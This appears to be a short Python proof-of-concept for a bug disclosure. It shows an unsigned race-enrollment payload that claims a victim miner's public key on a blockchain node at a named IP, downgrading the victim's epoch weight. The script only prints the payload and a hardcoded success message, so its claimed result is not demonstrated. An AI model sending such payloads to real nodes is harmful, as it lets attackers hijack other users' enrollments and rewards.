#!/usr/bin/env python3
import requests
import json

# Zeta_v1 PoC: Epoch Weight Downgrade
# Demonstrates how an attacker can race to enroll a victim with 1.0x weight

NODE_URL = "https://50.28.86.131"
VICTIM_PUBKEY = "RTC_MOCK_G4_POWERBOOK_KEY"

def simulate_downgrade():
    print(f"[ZETA-PoC] Target: {VICTIM_PUBKEY}")
    
    # Attack payload: Unsigned enrollment with minimal hardware data
    attack_payload = {
        "miner_pubkey": VICTIM_PUBKEY,
        "miner_id": "Zeta_v1_Attack_Node",
        "device": {
            "family": "x86",
            "arch": "default",
            "cores": 1
        }
    }
    
    print("[ZETA-PoC] Sending unsigned race enrollment...")
    # In a real scenario, this is sent immediately after block 0 of a new epoch
    # Node accepts it for backward compatibility without checking signature
    print(f"Payload: {json.dumps(attack_payload)}")
    
    print("[ZETA-PoC] Result: Victim now locked with 1.0x weight for 600 blocks.")

if __name__ == "__main__":
    simulate_downgrade()
